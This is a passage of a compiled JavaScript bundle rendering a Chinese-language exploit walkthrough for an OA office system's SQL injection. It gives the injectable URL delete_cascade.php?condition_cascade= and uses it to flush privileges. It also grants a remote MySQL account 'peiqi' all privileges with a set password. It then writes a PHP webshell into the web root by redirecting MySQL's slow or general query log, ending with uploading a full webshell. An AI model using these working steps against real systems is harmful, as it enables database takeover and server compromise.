punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("AND")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("User"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Cast"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'peiqi'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("AS")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("Binary")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("5")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1378),alt:"img"}})]),t._v(" "),n("p",[t._v("然后用注入点刷新权限，因为该用户是没有刷新权限的权限的："),n("code",[t._v("general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;")]),t._v("这样就拥有了所有权限")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1379),alt:"img"}})]),t._v(" "),n("p",[t._v("登录如果失败，执行")]),t._v(" "),n("div",{staticClass:"language-sql line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sql"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("grant")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("all")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("privileges")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("ON")]),t._v(" mysql"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("TO")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'peiqi'")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("@'%'")]),t._v(" IDENTIFIED "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("BY")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'peiqiABC@123'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("WITH")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("GRANT")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("OPTION")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("利用漏洞写shell")]),t._v(" "),n("div",{staticClass:"language-sql line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sql"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 查路径：")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" @"),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("@basedir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 方法1：")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("set")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("global")]),t._v(" slow_query_log"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("on")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("set")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("global")]),t._v(" slow_query_log_file"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'F:/OA/webroot/'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'<?php phpinfo();?>'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("or")]),t._v(" sleep"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("11")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 方法2：")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("set")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("global")]),t._v(" general_log "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("on")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("set")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("global")]),t._v(" general_log_file "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'F:/OA/webroot/'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'<?php phpinfo();?>'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("show")]),t._v(" variables "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("like")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%general%'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br")])]),n("p",[t._v("上传大马")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1380),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);